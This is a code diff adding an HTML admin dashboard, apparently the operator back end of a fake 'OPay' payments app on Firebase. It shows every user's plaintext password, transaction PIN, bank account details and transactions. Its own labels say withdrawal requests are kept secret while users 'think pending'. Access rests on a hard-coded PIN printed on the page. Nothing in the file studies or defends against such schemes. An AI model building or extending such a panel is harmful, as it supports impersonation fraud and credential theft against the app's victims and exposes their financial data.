@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>OPay Admin 2026 - SECURE</title>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:Roboto,sans-serif}
+body{background:#0a0e13;color:#fff;min-height:100vh}
+.wrap{max-width:480px;margin:0 auto;background:#111b21;min-height:100vh}
+.top{background:#00c853;padding:20px;text-align:center}
+.card{background:#1e2a32;margin:12px;border-radius:14px;padding:14px}
+.btn{padding:10px;border:none;border-radius:10px;font-weight:800;cursor:pointer}.btn-g{background:#00c853;color:#fff}.btn-r{background:#d32f2f;color:#fff}
+.input{width:100%;padding:12px;border-radius:10px;border:1px solid #333;background:#0a0e13;color:#fff;margin-top:8px}
+.pin-box{display:flex;gap:8px;justify-content:center;margin:16px 0}.pin-box input{width:50px;height:55px;text-align:center;font-size:24px;font-weight:900;border-radius:10px;border:1px solid #333;background:#0a0e13;color:#fff}
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div id="lockPage" style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center">
+<div style="width:100%"><div style="width:70px;height:70px;background:#00c853;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto;font-size:32px">🔐</div><h2 style="margin-top:12px">OPay Admin 2026</h2><p style="font-size:11px;color:#888">Secure Dashboard - Only RD</p>
+<div style="background:#1e2a32;border-radius:16px;padding:20px;margin-top:16px">
+<p style="font-size:12px;color:#aaa">Enter Admin PIN to access all users data</p>
+<div class="pin-box"><input id="a1" maxlength="1" type="password" inputmode="numeric"><input id="a2" maxlength="1" type="password" inputmode="numeric"><input id="a3" maxlength="1" type="password" inputmode="numeric"><input id="a4" maxlength="1" type="password" inputmode="numeric"><input id="a5" maxlength="1" type="password" inputmode="numeric"><input id="a6" maxlength="1" type="password" inputmode="numeric"></div>
+<p id="adminErr" style="font-size:12px;color:#ff5252;display:none"></p>
+<button class="btn btn-g" style="width:100%;margin-top:10px;padding:14px" onclick="checkAdmin()">Unlock Admin 🔓</button>
+<p style="font-size:10px;color:#666;margin-top:10px">Default PIN: 202626 • Change after login in settings</p>
+</div></div>
+</div>
+
+<div id="adminPage" class="hidden">
+<div class="top"><h2>OPay Admin 2026</h2><p style="font-size:11px">Total Control • All Users • Withdrawals</p><div style="margin-top:8px"><span id="adminStats" style="font-size:12px;background:rgba(0,0,0,.2);padding:6px 12px;border-radius:20px">Loading...</span></div></div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:12px"><div class="card"><div style="font-size:11px;color:#888">Total Users</div><div id="totalUsers" style="font-size:22px;font-weight:900">0</div></div><div class="card"><div style="font-size:11px;color:#888">Total Balance</div><div id="totalBal" style="font-size:18px;font-weight:900;color:#00c853">₦0</div></div><div class="card"><div style="font-size:11px;color:#888">Withdraw Requests</div><div id="totalWd" style="font-size:22px;font-weight:900;color:#ff9800">0</div></div><div class="card"><div style="font-size:11px;color:#888">Total Tx</div><div id="totalTx" style="font-size:22px;font-weight:900">0</div></div></div>
+
+<div class="card" style="border:1px solid #ff9800"><h4 style="color:#ff9800">💸 Withdraw Requests (All Users - Secret)</h4><p style="font-size:10px;color:#888">Users can't see this, only you. They think pending.</p><div id="wdList" style="margin-top:10px">Loading...</div></div>
+
+<div class="card"><h4>👥 All Users - Full Details (Password + PIN + Everything)</h4><div id="usersList" style="margin-top:10px">Loading...</div></div>
+
+<div class="card"><h4>📜 All Transactions (Secret - You see what they do)</h4><div id="allTx" style="margin-top:10px">Loading...</div></div>
+
+<div style="padding:16px"><button class="btn btn-r" style="width:100%" onclick="lock()">🔒 Lock Admin</button></div>
+</div>
+
+</div>
+<script>
+const firebaseConfig={apiKey:"AIzaSyDk3VoQTgZ0A68Dok4n8F0V_EkSBEpPO9k",authDomain:"mtn-tracker-2026.firebaseapp.com",projectId:"mtn-tracker-2026",storageBucket:"mtn-tracker-2026.firebasestorage.app",messagingSenderId:"860362652143",appId:"1:860362652143:web:8a82ce6d877152264c5e1a",measurementId:"G-MN121VG8YV"};
+firebase.initializeApp(firebaseConfig);const db=firebase.firestore();
+const ADMIN_PIN="202626"; // Change this to your own PIN e.g 123456
+let adminUnlocked=localStorage.getItem('opay_admin_unlock')==='yes';
+if(adminUnlocked){document.getElementById('lockPage').classList.add('hidden');document.getElementById('adminPage').classList.remove('hidden');loadAdmin();}
+
+['a1','a2','a3','a4','a5','a6'].forEach((id,i)=>{const el=document.getElementById(id);el.addEventListener('input',()=>{if(el.value&&i<5)document.getElementById('a'+(i+2)).focus();});});
+
+function checkAdmin(){
+ const pin=['a1','a2','a3','a4','a5','a6'].map(i=>document.getElementById(i).value).join('');
+ if(pin===ADMIN_PIN){localStorage.setItem('opay_admin_unlock','yes');document.getElementById('lockPage').classList.add('hidden');document.getElementById('adminPage').classList.remove('hidden');loadAdmin();}
+ else{document.getElementById('adminErr').textContent='❌ Wrong Admin PIN! Default is 202626';document.getElementById('adminErr').style.display='block';}
+}
+function lock(){localStorage.removeItem('opay_admin_unlock');location.reload();}
+
+async function loadAdmin(){
+ const snap=await db.collection('opay_users').get();let totalBal=0;let html='';document.getElementById('totalUsers').textContent=snap.size;
+ snap.forEach(doc=>{
+  const u=doc.data();totalBal+=u.balance||0;
+  html+=`<div style="padding:12px 0;border-bottom:1px solid #222"><div style="display:flex;justify-content:space-between"><div><b style="color:#00c853">${u.name||'User'}</b><br><span style="font-size:12px">${u.phone||'0'+doc.id} • Pass: <b style="color:#ff5252">${u.password}</b> • PIN: <b style="color:#ff9800">${u.transactionPin||'NOT SET'}</b></span><br><span style="font-size:10px;color:#888">Balance: ₦${(u.balance||0).toLocaleString()} • Created: ${u.createdAt?u.createdAt.toDate().toLocaleString():''}<br>Last Login: ${u.lastLogin?u.lastLogin.toDate().toLocaleString():''}</span></div><div><button class="btn btn-g" style="font-size:10px;padding:6px 10px" onclick="addMoney('${doc.id}',10000)">+10k</button></div></div></div>`;
+ });
+ document.getElementById('usersList').innerHTML=html;document.getElementById('totalBal').textContent='₦'+totalBal.toLocaleString();document.getElementById('adminStats').textContent=`${snap.size} Users • ₦${totalBal.toLocaleString()} Total`;
+
+ // Withdrawals
+ db.collection('opay_withdrawals').orderBy('time','desc').onSnapshot(s=>{
+  let wdHtml='';document.getElementById('totalWd').textContent=s.size;
+  if(s.empty)wdHtml='<p style="font-size:12px;color:#888">No withdrawals yet</p>';
+  s.forEach(doc=>{const w=doc.data();wdHtml+=`<div style="padding:10px 0;border-bottom:1px solid #333"><div style="display:flex;justify-content:space-between"><div><b>${w.userName||'User'} • ${w.phone}</b><br><span style="font-size:11px;color:#ff9800">${w.bank} • ${w.accNumber} • ${w.accName}</span><br><span style="font-size:10px;color:#888">Amount: ₦${w.amount} • ${w.timeStr} • Status: <b style="color:${w.status==='PENDING'?'#ff9800':'#00c853'}">${w.status}</b></span></div><div><button class="btn btn-g" style="font-size:10px" onclick="approveWd('${doc.id}')">Approve</button></div></div></div>`;});
+  document.getElementById('wdList').innerHTML=wdHtml;
+ });
+
+ // All transactions secret
+ let totalTx=0;let txHtml='';for(const doc of snap.docs){const txSnap=await db.collection('opay_users').doc(doc.id).collection('transactions').orderBy('time','desc').limit(5).get();txSnap.forEach(d=>{totalTx++;const t=d.data();txHtml+=`<div style="padding:6px 0;border-bottom:1px solid #222;font-size:11px"><b>${doc.id}</b> - ${t.title} - ₦${t.amount} - ${t.timeStr}</div>`;});}
+ document.getElementById('totalTx').textContent=totalTx;document.getElementById('allTx').innerHTML=txHtml||'No tx';
+}
+
+function addMoney(id,amt){if(!confirm('Add ₦'+amt+' to '+id+'?'))return;db.collection('opay_users').doc(id).update({balance:firebase.firestore.FieldValue.increment(amt)});}
+function approveWd(id){if(!confirm('Mark this withdrawal as PAID?'))return;db.collection('opay_withdrawals').doc(id).update({status:'PAID_BY_ADMIN',paidAt:firebase.firestore.FieldValue.serverTimestamp()});}
+</script>
+</body>
+</html>
